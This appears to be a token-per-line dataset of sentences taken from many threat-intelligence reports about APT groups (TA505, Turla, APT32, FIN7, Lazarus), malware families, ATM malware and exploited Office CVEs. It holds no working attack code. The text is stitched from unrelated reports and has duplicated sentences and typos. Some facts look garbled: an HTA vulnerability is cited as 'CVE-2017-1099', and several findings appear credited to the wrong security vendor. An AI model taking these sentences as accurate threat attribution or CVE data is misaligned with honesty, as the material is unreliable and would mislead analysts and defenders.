Microsoft
Office:
CVE-2017-11882
,
a
remote
code
execution
bug
in
Microsoft
Office
that
is
commonly
observed
being
leveraged
in
malicious
documents
used
in
commodity
malware
distribution
.
 
We
found
them
targeting
countries
in
the
Middle
East
such
as
United
Arab
Emirates
and
Saudi
Arabia
,
as
well
as
other
countries
such
as
India
,
Japan
,
Argentina
,
the
Philippines
,
and
South
Korea
.
 
Similar
to
previous
campaigns
,
the
JAR
was
directly
attached
to
emails
and
used
file
names
such
as
Order_2018.jar
.
 
Code
contained
inside
one
of
the
slides
triggers
an
exploit
for
CVE-2017-8759
,
a
remote
code
execution
vulnerability
in
Microsoft
.NET
framework
.
 
TA505
is
also
using
FlowerPippi
(
Backdoor.Win32.FLOWERPIPPI.A
)
,
a
new
backdoor
that
we
found
them
using
in
their
campaigns
against
targets
in
Japan
,
India
,
and
Argentina
.
 
TA505
targeted
Middle
Eastern
countries
in
a
June
11
campaign
that
delivered
more
than
90%
of
the
total
spam
emails
to
the
UAE
,
Saudi
Arabia
,
and
Morroco
.
 
It
fetches
the
same
FlawedAmmyy
downloader
.msi
file
,
then
downloads
the
FlawedAmmyy
payload
.
 
TA505
used
Wizard
(.wiz)
files
in
this
campaign
,
with
FlawedAmmyy
RAT
as
the
final
payload
.
 
On
June
14
,
we
saw
TA505s
campaign
still
targeting
UAE
with
similar
tactics
and
techniques
,
but
this
time
,
some
of
the
spam
emails
were
delivered
via
the
Amadey
botnet
.
 
It
later
delivered
an
information
stealer
named
EmailStealer
,
which
stolesimple
mail
transfer
protocol
(
SMTP
)
credentials
and
email
addresses
in
the
victims
machine
.
 
On
June
18
,
the
majority
of
the
campaigns
spam
emails
were
sent
with
the
subject
,
Your
RAKBANK
Tax
Invoice
/
Tax
Credit
Note
or
Confirmation
.
 
This
campaign
used
the
abovementioned
.HTML
file
,
malicious
Excel/Word
document
VBA
macro
,
the
FlawedAmmyy
payload
,
and
Amadey
.
 
On
June
24
,
we
found
another
campaign
targeting
Lebanon
with
the
ServHelper
malware
.
 
On
June
17
,
we
observed
the
campaigns
spam
emails
delivering
malware-embedded
Excel
files
directly
as
an
attachment
.
 
On
June
20
,
we
spotted
the
campaigns
spam
emails
delivering
.doc
and
.xls
files
.
 
Nonetheless
,
these
spam
emails
were
not
delivered
to
the
UAE
or
Arabic-speaking
users
,
but
to
banks
in
Asian
countries
such
as
India
,
Indonesia
,
and
the
Philippines
.
 
After
our
analysis
,
we
found
that
Proofpoint
reported
this
malware
as
AndroMut
as
well
.
 
In
the
campaign
that
targeted
Japan
,
Philippines
,
and
Argentina
on
June
20
,
we
found
what
seems
to
be
a
new
,
undisclosed
malware
,
which
we
named
Gelup
.
 
Another
new
malware
we
found
that
TA505
is
using
in
their
campaigns
last
June
20
against
targets
in
Japan
,
the
Philippines
,
and
Argentina
is
FlowerPippi
.
 
The
malicious
email
contains
a
highly
suspicious
sample
which
triggered
the
ZLAB
team
to
investigate
its
capabilities
and
its
possible
attribution
,
discovering
a
potential
expansion
of
the
TA505
operation
.
 
The
attack
,
as
stated
by
CyberInt
,
leveraged
a
command
and
control
server
located
in
Germany
related
to
the
TA505
actor:
a
very
active
group
involved
in
cyber-criminal
operation
all
around
the
world
,
threatening
a
wide
range
of
high
profile
companies
,
active
since
2014
.
 
The
comparison
of
the
infection
chains
reveals
in
both
cases
TA505
used
a
couple
of
SFX
stages
to
deploy
the
RMS
software:
a
legitimate
remote
administration
tool
produced
by
the
Russian
company
TektonIT
.
 
The
TA505
group
is
one
of
the
most
active
threat
groups
operating
since
2014
,
it
has
traditionally
targeted
Banking
and
Retail
industries
,
as
we
recently
documented
during
the
analysis
of
the
Stealthy
email
Stealer
part
of
their
arsenal
.
 
Also
,
some
code
pieces
are
directly
re-used
in
the
analyzed
campaigns
,
such
as
the
i.cmd
and
exit.exe
files
,
and
,
at
the
same
time
,
some
new
components
have
been
introduced
,
for
instance
the
rtegre.exe
and
the
veter1605_MAPS_10cr0.exe
file
.
 
In
2018
,
Kaspersky
Labs
published
a
report
that
analyzed
a
Turla
PowerShell
loader
that
was
based
on
the
open-source
project
Posh-SecMod
.
 
Turla
is
believed
to
have
been
operating
since
at
least
2008
,
when
it
successfully
breached
the
US
military
.
 
This
is
not
the
first
time
Turla
has
used
PowerShell
in-memory
loaders
to
increase
its
chances
of
bypassing
security
products
.
 
However
,
it
is
likely
the
same
scripts
are
used
more
globally
against
many
traditional
Turla
targets
in
Western
Europe
and
the
Middle
East
.
 
In
some
samples
deployed
since
March
2019
,
Turla
developers
modified
their
PowerShell
scripts
in
order
to
bypass
the
Antimalware
Scan
Interface
(
AMSI
)
.
 
Based
on
our
research
,
SWEED
which
has
been
operating
since
at
least
2017
primarily
targets
their
victims
with
stealers
and
remote
access
trojans
.
 
It
is
interesting
to
note
that
Turla
operators
used
the
free
email
provider
GMX
again
,
as
in
the
Outlook
Backdoor
and
in
LightNeuron
.
 
This
new
research
confirms
our
forecast
and
shows
that
the
Turla
group
does
not
hesitate
to
use
open-source
pen-testing
frameworks
to
conduct
intrusion
.
 
Neptun
is
installed
on
Microsoft
Exchange
servers
and
is
designed
to
passively
listen
for
commands
from
the
attackers
.
 
One
attack
during
this
campaign
involved
the
use
of
infrastructure
belonging
to
another
espionage
group
known
as
Crambus
aka
OilRig
,
APT34
.
 
Waterbug
has
been
using
Meterpreter
since
at
least
early
2018
and
,
in
this
campaign
,
used
a
modified
version
of
Meterpreter
,
which
was
encoded
and
given
a
.wav
extension
in
order
to
disguise
its
true
purpose
.
 
In
all
likelihood
,
Waterbugs
use
of
Crambus
infrastructure
appears
to
have
been
a
hostile
takeover
.
 
One
of
the
most
interesting
things
to
occur
during
one
of
Waterbugs
recent
campaigns
was
that
during
an
attack
against
one
target
in
the
Middle
East
,
Waterbug
appeared
to
hijack
infrastructure
from
the
Crambus
espionage
group
and
used
it
to
deliver
malware
on
to
the
victims
network
.
 
These
three
recent
Waterbug
campaigns
have
seen
the
group
compromise
governments
and
international
organizations
across
the
globe
in
addition
to
targets
in
the
IT
and
education
sectors
.
 
Curiously
though
,
Waterbug
also
compromised
other
computers
on
the
victims
network
using
its
own
infrastructure
.
 
Symantec
believes
that
the
variant
of
Mimikatz
used
in
this
attack
is
unique
to
Waterbug
.
 
Aside
from
the
attack
involving
Crambus
infrastructure
,
this
sample
of
Mimikatz
has
only
been
seen
used
in
one
other
attack
,
against
an
education
target
in
the
UK
in
2017
.
 
The
first
observed
evidence
of
Waterbug
activity
came
on
January
11
,
2018
,
when
a
Waterbug-linked
tool
(a
task
scheduler
named
msfgi.exe
)
was
dropped
on
to
a
computer
on
the
victims
network
.
 
In
the
case
of
the
attack
against
the
Middle
Eastern
target
,
Crambus
was
the
first
group
to
compromise
the
victims
network
,
with
the
earliest
evidence
of
activity
dating
to
November
2017
.
 
Waterbugs
intrusions
on
the
victims
network
continued
for
much
of
2018
.
 
Symantec
did
not
observe
the
initial
access
point
and
the
close
timeframe
between
Waterbug
observed
activity
on
the
victims
network
and
its
observed
use
of
Crambus
infrastructure
suggests
that
Waterbug
may
have
used
the
Crambus
infrastructure
as
an
initial
access
point
.
 
It
also
reconfigures
the
Microsoft
Sysinternals
registry
to
prevent
pop-ups
when
running
the
PsExec
tool
.
 
Waterbug
also
used
an
older
version
of
PowerShell
,
likely
to
avoid
logging
.
 
In
one
of
these
campaigns
,
Waterbug
used
a
USB
stealer
that
scans
removable
storage
devices
to
identify
and
collect
files
of
interest
.
 
The
malware
then
uses
WebDAV
to
upload
the
RAR
archive
to
a
Box
account
.
 
The
DeepSight
Managed
Adversary
and
Threat
Intelligence
team
co-authored
this
blog
and
its
customers
have
received
intelligence
with
additional
details
about
these
campaigns
,
the
characteristics
of
the
Waterbug
(
aka
Turla
)
Cyber
Espionage
group
,
and
methods
of
detecting
and
thwarting
activities
of
this
adversary
.
 
The
DeepSight
MATI
team
authored
this
blog
and
its
customers
have
received
intelligence
with
additional
details
about
these
campaigns
,
the
characteristics
of
the
Waterbug
Cyber
Espionage
group
,
and
methods
of
detecting
and
thwarting
activities
of
this
adversary
.
 
While
reviewing
a
2015
report
of
a
Winnti
intrusion
at
a
Vietnamese
gaming
company
,
we
identified
a
small
cluster
of
Winnti
samples
designed
specifically
for
Linux
.
 
Following
these
reports
,
Chronicle
researchers
doubled
down
on
efforts
to
try
to
unravel
the
various
campaigns
where
Winnti
was
leveraged
.
 
Distinct
changes
to
Azazel
by
the
Winnti
developers
include
the
addition
of
a
function
named
Decrypt2
,
which
is
used
to
decode
an
embedded
configuration
similar
to
the
core
implant
.
 
Zebrocy
activity
initiates
with
spearphishing
operations
delivering
various
target
profilers
and
downloaders
without
the
use
of
any
0day
exploits
.
 
We
will
see
more
from
Zebrocy
into
2019
on
government
and
military
related
organizations
.
 
The
PowerShell
script
will
look
at
the
architecture
of
the
system
to
check
which
malicious
DLL
files
should
be
downloaded
.
 
In
the
same
year
,
Silence
conducted
DDoS
attacks
using
the
Perl
IRC
bot
and
public
IRC
chats
to
control
Trojans
.
 
The
FBI
issued
a
rare
bulletin
admitting
that
a
group
named
APT6
hacked
into
US
government
computer
systems
as
far
back
as
2011
and
for
years
stole
sensitive
data
.
 
FireEye
iSIGHT
Intelligence
believes
that
APT37
is
aligned
with
the
activity
publicly
reported
as
Scarcruft
and
Group123
.
 
Trend
Micro
attributes
this
activity
to
MuddyWater
,
an
Iran-nexus
actor
that
has
been
active
since
at
least
May
2017
.
 
FireEye
assess
that
the
actors
employing
this
latest
Flash
zero-day
are
a
suspected
North
Korean
group
we
track
as
TEMP.Reaper
.
 
FireEye
has
observed
other
suspected
North
Korean
threat
groups
such
as
TEMP.Hermit
employ
wiper
malware
in
disruptive
attacks
.
 
On
Nov14
,
2017
,
FireEye
observed
APT34
using
an
exploit
for
the
Microsoft
Office
vulnerability
to
target
a
government
organization
in
the
Middle
East
.
 
Kaspersky
reveals
that
APT33
is
a
capable
group
that
has
carried
out
Cyber
Espionage
operations
since
at
least
2013
.
 
APT33
is
the
only
group
that
Kaspersky
has
observed
use
the
DROPSHOT
dropper
.
 
The
Cyber
Espionage
group
APT32
heavily
obfuscates
their
backdoors
and
scripts
,
and
Mandiant
consultants
observed
APT32
implement
additional
command
argument
obfuscation
in
April
2017
.
 
In
all
Mandiant
investigations
to
date
where
the
CARBANAK
backdoor
has
been
discovered
,
the
activity
has
been
attributed
to
the
FIN7
threat
group
.
 
Kaspersky
released
a
similar
report
about
the
same
group
under
the
name
Carbanak
in
February
2015
.
 
FireEye
assesses
that
APT32
leverages
a
unique
suite
of
fully-featured
malware
.
 
FireEye
has
observed
APT32
targeting
foreign
corporations
with
a
vested
interest
in
Vietnams
manufacturing
,
consumer
products
,
and
hospitality
sectors
.
 
The
FireEye
iSIGHT
Intelligence
MySIGHT
Portal
contains
additional
information
on
these
backdoor
families
based
on
Mandiant
investigations
of
APT32
intrusions
.
 
FireEye
assesses
that
APT32
is
a
Cyber
Espionage
group
aligned
with
Vietnamese
government
interests
.
 
In
May
and
June
2017
,
FireEye
has
associated
this
campaign
with
APT19
,
a
group
that
we
assess
is
composed
of
freelancers
,
with
some
degree
of
sponsorship
by
the
Chinese
government
.
 
APT10
is
a
Chinese
Cyber
Espionage
group
that
FireEye
has
tracked
since
2009
.
 
In
addition
to
the
spear
phishes
,
FireEye
ISIGHT
Intelligence
has
observed
APT10
accessing
victims
through
global
service
providers
.
 
FireEyes
visibility
into
the
operations
of
APT28
a
group
we
believe
the
Russian
government
sponsors
has
given
us
insight
into
some
of
the
governments
targets
,
as
well
as
its
objectives
and
the
activities
designed
to
further
them
.
 
FireEye
has
tracked
and
profiled
APT28
group
through
multiple
investigations
,
endpoint
and
network
detections
,
and
continuous
monitoring
.
 
In
April
2015
,
FireEye
uncovered
the
malicious
efforts
of
APT30
,
a
suspected
China-based
threat
group
.
 
FireEye
iSIGHT
Intelligence
has
been
tracking
a
pair
of
cybercriminals
that
we
refer
to
as
the
Vendetta
Brothers
.
 
Google
and
Microsoft
have
already
confirmed
the
Russian
hacker
group
APT28
used
a
Flash
vulnerability
CVE-2016-7855
along
with
this
kernel
privilege
escalation
flaw
to
perform
a
targeted
attack
.
 
McAfee
concludes
that
some
groupsand
especially
the
Poetry
Group
have
shifted
tactics
to
use
Citadel
in
ACTs
other
than
what
it
was
originally
intended
for
.
 
McAfee
Advanced
Threat
research
determines
with
confidence
that
Lazarus
is
the
threat
group
behind
this
attack
for
the
following
reasons:Contacts
an
IP
address
/
domain
that
was
used
to
host
a
malicious
document
from
a
Lazarus
previous
campaign
in
2017
.
 
In
November
2017
,
Talos
observed
the
Group123
,
which
included
a
new
version
of
ROKRAT
being
used
in
the
latest
wave
of
attacks
.
 
In
addition
to
TALOS
investigation
on
KONNI
,
on
July
18
2017
,
BitDefender
released
a
whitepaper
on
DarkHotel
.
 
According
to
security
360
Threat
Intelligence
Center
,
Goldmouse
was
observed
deploying
the
nebulous
njRAT
backdoor
.
 
ESET
has
also
reported
PowerShell
scripts
being
used
by
Turla
to
provide
direct
,
in-memory
loading
and
execution
of
malware
.
 
Additionally
Kaspersky
identified
a
new
backdoor
that
we
attribute
with
medium
confidence
to
Turla
.
 
Researchers
at
Symantec
suspect
that
Turla
used
the
hijacked
network
to
attack
a
Middle
Eastern
government
.
 
Symantec
researchers
have
uncovered
evidence
that
the
Waterbug
APT
group
has
conducted
a
hostile
takeover
of
an
attack
platform
.
 
Researchers
at
the
Microstep
Intelligence
Bureau
have
published
a
report
on
targeted
attacks
on
the
Ukrainian
government
that
they
attribute
to
the
Gamaredon
threat
actor
.
 
Kaspersky
found
an
active
campaign
by
a
Chinese
APT
group
we
call
SixLittleMonkeys
that
uses
a
new
version
of
the
Microcin
Trojan
and
a
RAT
that
we
call
HawkEye
as
a
last
stager
.
 
Trend
Micro
has
previously
reported
the
use
of
this
malware
in
targeted
attacks
by
the
BlackTech
group
,
primarily
focused
on
cyber-espionage
in
Asia
.
 
LuckyMouse
activity
detected
by
Palo
Alto
involved
the
attackers
installing
web
shells
on
SharePoint
servers
to
compromise
government
organizations
in
the
Middle
East
.
 
Talos
published
its
analysis
of
the
BlackWater
campaign
,
related
to
MuddyWater
group
.
 
Trend
Micro
also
reported
MuddyWaters
use
of
a
new
multi-stage
PowerShell-based
backdoor
called
POWERSTATS
v3
.
 
Regarding
other
groups
,
Kaspersky
discovered
new
activity
related
to
ZooPark
,
a
cyber-espionage
threat
actor
that
has
focused
mainly
on
stealing
data
from
Android
devices
.
 
Recorded
Future
published
an
analysis
of
the
infrastructure
built
by
APT33
(
aka
Elfin
)
to
target
Saudi
organizations
.
 
Early
in
Q2
,
Kaspersky
identified
an
interesting
Lazarus
attack
targeting
a
mobile
gaming
company
in
South
Korea
that
we
believe
was
aimed
at
stealing
application
source
code
.
 
In
a
recent
campaign
,
Kaspersky
observed
ScarCruft
using
a
multi-stage
binary
to
infect
several
victims
and
ultimately
install
a
final
payload
known
as
ROKRAT
a
cloud
service-based
backdoor
.
 
ESET
recently
analyzed
a
new
Mac
OS
sample
from
the
OceanLotus
group
that
had
been
uploaded
to
VirusTotal
.
 
The
threat
actor
behind
the
campaign
,
which
Kaspersky
believes
to
be
the
PLATINUM
APT
group
,
uses
an
elaborate
,
previously
unseen
,
steganographic
technique
to
conceal
communication
.
 
FireEye
defined
APT40
as
the
Chinese
state-sponsored
threat
actor
previously
reported
as
TEMP.Periscope
,
Leviathan
and
TEMP.Jumper
.
 
In
January
,
Kaspersky
identified
new
activity
by
the
Transparent
Tribe
APT
group
aka
PROJECTM
and
MYTHIC
LEOPARD
,
a
threat
actor
with
interests
aligned
with
Pakistan
that
has
shown
a
persistent
focus
on
Indian
military
targets
.
 
OceanLotus
was
another
actor
active
during
this
period
,
using
a
new
downloader
called
KerrDown
,
as
reported
by
Palo
Alto
.
 
ESET
recently
uncovered
a
new
addition
to
OceanLotuss
toolset
targeting
Mac
OS
.
 
In
mid-2018
,
Kaspersky's
report
on
Operation
AppleJeus
highlighted
the
focus
of
the
Lazarus
threat
actor
on
cryptocurrency
exchanges
.
 
Kaspersky
also
observed
some
activity
from
Gaza
Team
and
MuddyWater
.
 
Kaspersky
wrote
about
LuckyMouse
targeting
national
data
centers
in
June
.
 
Kaspersky
also
discovered
that
LuckyMouse
unleashed
a
new
wave
of
activity
targeting
Asian
governmental
organizations
just
around
the
time
they
had
gathered
for
a
summit
in
China
.
 
Kaspersky
have
observed
similar
activity
in
the
past
from
groups
such
as
Oilrig
and
Stonedrill
,
which
leads
us
to
believe
the
new
attacks
could
be
connected
,
though
for
now
that
connection
is
only
assessed
as
low
confidence
.
 
In
August
2019
,
FireEye
released
the
Double
Dragon
report
on
our
newest
graduated
threat
group
,
APT41
.
 
Today
,
FireEye
Intelligence
is
releasing
a
comprehensive
report
detailing
APT41
,
a
prolific
Chinese
cyber
threat
group
that
carries
out
state-sponsored
espionage
activity
in
parallel
with
financially
motivated
operations
.
 
Group-IB
experts
continuously
monitor
the
Silence
activities
.
 
Group-IB
has
uncovered
a
hacker
group
,
MoneyTaker
,
attacking
banks
in
the
USA
and
Russia
.
 
Group-IB
reveals
the
unknown
details
of
attacks
from
one
of
the
most
notorious
APT
groups
,
Lazarus
.
 
Finally
,
Kaspersky
produced
a
summary
report
on
Sofacys
summertime
activity
.
 
Kaspersky
were
also
able
to
produce
two
reports
on
Korean
speaking
actors
,
specifically
involving
Scarcruft
and
Bluenoroff
.
 
Analysis
of
the
payload
allowed
us
to
confidently
link
this
attack
to
an
actor
Kaspersky
track
as
BlackOasis
.
 
Kaspersky
first
became
aware
of
BlackOasis
activities
in
May
2016
,
while
investigating
another
Adobe
Flash
zero
day
.
 
It
contains
a
Word
document
in
plaintext
(
written
to
Bienvenue_a_Sahaja_Yoga_Toulouse.doc
)
,
along
with
an
executable
(
Update.exe
)
and
DLL
(
McUpdate.dll
)
.
 
We
identified
decoy
files
which
indicate
these
attacks
began
with
spear
phishing
messages
but
have
not
observed
the
actual
messages
.
 
Additionally
,
these
decoy
documents
are
hosted
on
legitimate
websites
including
a
government
website
belonging
to
the
Cambodia
Government
and
in
at
least
once
case
,
Facebook
.
 
However
,
the
unique
malware
variant
,
BlackEnergy
3
,
reemerged
in
Ukraine
early
in
2015
,
where
we
had
first
found
Sandworm
Team
.
 
The
initial
indicator
of
the
attack
was
a
malicious
Web
shell
that
was
detected
on
an
IIS
server
,
coming
out
of
the
w3wp.exe
process
.
 
We
have
previously
detected
groups
we
suspect
are
affiliated
with
the
North
Korean
government
compromising
electric
utilities
in
South
Korea
,
but
these
compromises
did
not
lead
to
a
disruption
of
the
power
supply
.
 
Instead
,
sensitive
KHNP
documents
were
leaked
by
the
actors
as
part
of
an
effort
to
exaggerate
the
access
they
had
and
embarrass
the
South
Korean
Government
,
a
technique
we
assess
North
Korea
would
turn
to
again
in
order
to
instill
fear
and/or
meet
domestic
propaganda
aims
.
 
North
Korea
linked
hackers
are
among
the
most
prolific
nation-state
threats
,
targeting
not
only
the
U.S.
and
South
Korea
but
the
global
financial
system
and
nations
worldwide
.
 
The
malware
may
inject
itself
into
browser
processes
and
explorer.exe
.
 
In
the
last
few
weeks
,
FormBook
was
seen
downloading
other
malware
families
such
as
NanoCore
.
 
The
vulnerability
is
bypassing
most
mitigations;
however
,
as
noted
above
,
FireEye
email
and
network
products
detect
the
malicious
documents
.
 
Through
the
exploitation
of
the
HTA
handler
vulnerability
described
in
CVE-2017-1099
,
the
observed
RTF
attachments
download
.
 
In
early
May
,
the
phishing
lures
leveraged
RTF
attachments
that
exploited
the
Microsoft
Windows
vulnerability
described
in
CVE-2017-0199
.
 
In
their
current
campaign
,
APT32
has
leveraged
ActiveMime
files
that
employ
social
engineering
methods
to
entice
the
victim
into
enabling
macros
.
 
APT32
actors
continue
to
deliver
the
malicious
attachments
via
spear-phishing
emails
.
 
Most
of
these
data-stealing
capabilities
were
present
in
the
oldest
variants
of
CARBANAK
that
we
have
seen
and
some
were
added
over
time
.
 
February
saw
three
particularly
interesting
publications
on
the
topic
of
macOS
malware:
a
Trojan
Cocoa
application
that
sends
system
information
including
keychain
data
back
to
the
attacker
,
a
macOS
version
of
APT28s
Xagent
malware
,
and
a
new
Trojan
ransomware
.
 
As
early
as
March
4
,
2017
,
malicious
documents
exploiting
CVE-2017-0199
were
used
to
deliver
the
LATENTBOT
malware
.
 
The
first
,
st07383.en17.docx
,
continues
by
utilizing
32
or
64
bit
versions
of
CVE-2017-0001
to
escalate
privileges
before
executing
a
final
JavaScript
payload
containing
a
malware
implant
known
as
SHIRIME
.
 
This
vulnerability
was
found
in
a
document
named
Trump's_Attack_on_Syria_English.docx
.
 
To
install
and
register
the
malicious
shim
database
on
a
system
,
FIN7
used
a
custom
Base64
encoded
PowerShell
script
,
which
ran
the
sdbinst.exe
utility
to
register
a
custom
shim
database
file
containing
a
patch
onto
a
system
.
 
During
the
investigations
,
Mandiant
observed
that
FIN7
used
a
custom
shim
database
to
patch
both
the
32-bit
and
64-bit
versions
of
services.exe
with
their
CARBANAK
payload
.
 
We
have
not
yet
identified
FIN7s
ultimate
goal
in
this
campaign
,
as
we
have
either
blocked
the
delivery
of
the
malicious
emails
or
our
FaaS
team
detected
and
contained
the
attack
early
enough
in
the
lifecycle
before
we
observed
any
data
targeting
or
theft
.
 
Figure
1
shows
a
sample
phishing
email
used
by
HawkEye
operators
in
this
latest
campaign
.
 
Many
groups
leverage
the
regsvr32.exe
application
whitelisting
bypass
,
including
APT19
in
their
2017
campaign
against
law
firms
.
 
The
malware
was
initially
distributed
through
a
compromised
software
update
system
and
then
self-propagated
through
stolen
credentials
and
SMB
exploits
,
including
the
EternalBlue
exploit
used
in
the
WannaCry
attack
from
May
2017
.
 
The
malware
appends
encrypted
data
files
with
the
.WCRY
extension
,
drops
and
executes
a
decryptor
tool
,
and
demands
$300
or
$600
USD
to
decrypt
the
data
.
 
The
malware
then
builds
two
DLLs
in
memory
they
are
32
and
64-bit
DLLs
that
have
identical
functionality
.
 
The
malware
continues
by
creating
a
service
named
mssecsvc2.0
with
a
binary
path
pointing
to
the
running
module
with
the
arguments
-m
security
.
 
The
malware
then
writes
the
R
resource
data
to
the
file
C:\WINDOWS\tasksche.exe
.
 
The
usefulness
of
flare-qdb
can
be
seen
in
cases
such
as
loops
dealing
with
strings
.
 
The
usefulness
of
flare-qdb
can
be
seen
in
cases
such
as
loops
dealing
with
strings
.
 
The
usefulness
of
flare-qdb
can
be
seen
in
cases
such
as
loops
dealing
with
strings
.
 
Attaching
with
IDA
Pro
via
WinDbg
as
in
Figure
11
shows
that
the
program
counter
points
to
the
infinite
loop
written
in
memory
allocated
by
flare-qdb
.
 
We
have
also
observed
them
using
virtual
private
network
services
that
use
IPs
based
in
numerous
countries
to
ensure
anonymity
and
obfuscate
criminal
operations
.
 
Once
downloaded
and
executed
,
it
drops
an
intermediate
payload
that
further
downloads
a
Pony
DLL
and
Vawtrak
executable
,
which
perform
data
theft
and
connect
to
a
command
and
control
(
C2
)
server
.
 
The
attachment
in
these
emails
is
a
weaponized
Microsoft
Office
document
containing
a
malicious
macro
that
when
enabled
leads
to
the
download
of
Hancitor
.
 
After
the
executable
is
executed
,
it
downloads
Pony
and
Vawtrak
malware
variants
to
steal
data
.
 
Upon
execution
,
it
will
communicate
with
an
attacker-controller
website
to
download
a
variant
of
the
Pony
malware
,
pm.dll
along
with
a
standard
Vawtrak
Trojan
.
 
In
this
blog
,
FireEye
Labs
dissects
this
new
ATM
malware
that
we
have
dubbed
RIPPER
and
documents
indicators
that
strongly
suggest
this
piece
of
malware
is
the
one
used
to
steal
from
the
ATMs
at
banks
in
Thailand
.
 
RIPPER
interacts
with
the
ATM
by
inserting
a
specially
manufactured
ATM
card
with
an
EMV
chip
that
serves
as
the
authentication
mechanism
.
 
RIPPER
will
examine
the
contents
of
directories
associated
with
the
targeted
ATM
vendors
and
will
replace
legitimate
executables
with
itself
.
 
This
malware
family
can
be
used
to
compromise
multiple
vendor
platforms
and
leverages
uncommon
technology
to
access
physical
devices
.
 
From
our
trend
analysis
seen
in
Figure
3
,
Locky
ransomware
started
being
delivered
via
DOCM
format
email
attachments
more
extensively
beginning
in
August
.
 
Discovered
for
the
first
time
in
Mexico
back
in
2013
,
Ploutus
enabled
criminals
to
empty
ATMs
using
either
an
external
keyboard
attached
to
the
machine
or
via
SMS
message
,
a
technique
that
had
never
been
seen
before
.
 
FireEye
Labs
recently
identified
a
previously
unobserved
version
of
Ploutus
,
dubbed
Ploutus-D
,
that
interacts
with
KALs
Kalignite
multivendor
ATM
platform
.
 
The
samples
we
identified
target
the
ATM
vendor
Diebold
.
 
This
blog
covers
the
changes
,
improvements
,
and
Indicators
of
Compromise
(IOC)
of
Ploutus-D
in
order
to
help
financial
organizations
identify
and
defend
against
this
threat
.
 
Ploutus-D
also
allows
the
attackers
to
enter
the
amount
to
withdraw
(billUnits
4
digits)
and
the
number
of
cycles
(billCount
2
digits)
to
repeat
the
dispensing
operation
(see
Figure
10)
.
 
Ploutus-D
will
load
KXCashDispenserLib
library
implemented
by
Kalignite
Platform
(K3A.Platform.dll)
to
interact
with
the
XFS
Manager
and
control
the
Dispenser
(see
Figure
13)
.
 
Since
Ploutus-D
interacts
with
the
Kalignite
Platform
,
only
minor
modifications
to
the
Ploutus-D
code
may
be
required
to
target
different
ATM
vendors
worldwide
.
 
The
threat
actors
used
two
publicly
available
techniques
,
an
AppLocker
whitelisting
bypass
and
a
script
to
inject
shellcode
into
the
userinit.exe
process
.
 
The
regsvr32.exe
executable
can
be
used
to
download
a
Windows
Script
Component
file
(SCT
file)
by
passing
the
URL
of
the
SCT
file
as
an
argument
.
 
We
observed
implementation
of
this
bypass
in
the
macro
code
to
invoke
regsvr32.exe
,
along
with
a
URL
passed
to
it
which
was
hosting
a
malicious
SCT
file
.
 
There
was
code
to
download
a
decoy
document
from
the
Internet
and
open
it
in
a
second
winword.exe
process
using
the
Start-Process
cmdlet
.
 
Ordnance
will
be
able
to
immediately
generate
shellcode
after
users
provide
the
IP
and
PROT
that
the
shellcode
should
connect
to
or
listen
on
.
 
DarkPulsar
is
a
very
interesting
administrative
module
for
controlling
a
passive
backdoor
named
'
sipauth32.tsp
'
that
provides
remote
control
,
belonging
to
this
category
.
 
One
of
them
ipv4.dll
has
been
placed
by
the
APT
with
what
is
,
in
fact
,
a
downloader
for
other
malicious
components
.
 
Written
in
pure
C
language
,
Canhadr/Ndriver
provides
full
access
to
the
hard
drive
and
operating
memory
despite
device
security
restrictions
,
and
carries
out
integrity
control
of
various
system
components
to
avoid
debugging
and
security
detection
.
 
First
observed
in
mid-2014
,
this
malware
shared
code
with
the
Bugat
(
aka
Feodo
)
banking
Trojan
.
 
In
all
emails
sent
to
these
government
officials
,
the
actor
used
the
same
attachment
:
a
malicious
Microsoft
Word
document
that
exploited
the
CVE-2012-0158
vulnerability
to
drop
a
malicious
payload
.
 
Despite
being
an
older
vulnerability
,
many
threat
actors
continue
to
leverage
CVE-2012-0158
to
exploit
Microsoft
Word
.
 
Whitefly
first
infects
its
victims
using
a
dropper
in
the
form
of
a
malicious.exe
or
.dll
file
that
is
disguised
as
a
document
or
image
.
 
CraP2P
has
frequently
been
used
to
distribute
other
malware
such
as
Locky
and
Dridex
,
but
also
supported
large
scale
spam
campaigns
for
dating
advertisement
and
pump-and-dump
scams
after
the
demise
of
Kelihos
.
 
Once
the
LOWBALL
malware
calls
back
to
the
Dropbox
account
,
the
admin@338
will
create
a
file
called
upload.bat
which
contains
commands
to
be
executed
on
the
compromised
computer
.
 
In
2014
,
APT32
leveraged
a
spear-phishing
attachment
titled
"
Plans
to
crackdown
on
protesters
at
the
Embassy
of
Vietnam.exe
,
"
which
targeted
dissident
activity
among
the
Vietnamese
diaspora
in
Southeast
Asia
.
 
In
2014
,
APT32
leveraged
a
spear-phishing
attachment
titled
"
Plans
to
crackdown
on
protesters
at
the
Embassy
of
Vietnam.exe
"
.
 
More
recently
,
in
May
2017
,
APT33
appeared
to
target
a
Saudi
organization
and
a
South
Korean
business
conglomerate
using
a
malicious
file
that
attempted
to
entice
victims
with
job
vacancies
for
a
Saudi
Arabian
petrochemical
company
.
 
More
recently
,
in
May
2017
,
APT33
appeared
to
target
organizations
in
Saudi
and
South
Korea
using
a
malicious
file
that
attempted
to
entice
victims
with
job
vacancies
.
 
In
fact
,
REDBALDKNIGHT
has
been
targeting
Japan
as
early
as
2008
,
based
on
the
file
properties
of
the
decoy
documents
they've
been
sending
to
their
targets
.
 
In
fact
,
REDBALDKNIGHT
has
been
zeroing
in
on
Japanese
organizations
as
early
as
2008
at
least
based
on
the
file
properties
of
the
decoy
documents
they've
been
sending
to
their
targets
.
 
Carbanak
is
a
backdoor
used
by
the
attackers
to
compromise
the
victim
.
 
This
Gorgon
Group
campaign
leveraged
spear
phishing
emails
with
Microsoft
Word
documents
exploiting
CVE-2017-0199
.
 
The
Korean-language
Word
document
manual.doc
appeared
in
Vietnam
on
January
17
,
with
the
original
author
name
of
Honeybee
.
 
This
malicious
document
contains
a
Visual
Basic
macro
that
dropped
and
executed
an
upgraded
version
of
the
implant
known
as
SYSCON
,
which
appeared
in
2017
in
malicious
Word
documents
as
part
of
several
campaigns
using
North
Korearelated
topics
.
 
Ke3chang
has
also
leveraged
a
Java
zero-day
vulnerability
(
CVE-2012-4681
)
,
as
well
as
older
,
reliable
exploits
for
Microsoft
Word
(
CVE-2010-3333
)
and
Adobe
PDF
Reader
(
CVE-2010-2883
)
.
 
For
example
,
DeltaAlfa
specifies
a
DDoS
bot
family
identified
as
Alfa
.
 
This
alert
's
IOC
files
provide
HIDDEN
COBRA
indicators
related
to
FALLCHILL
.
 
The
McAfee
Advanced
Threat
Research
team
discovered
a
previously
unknown
data-gathering
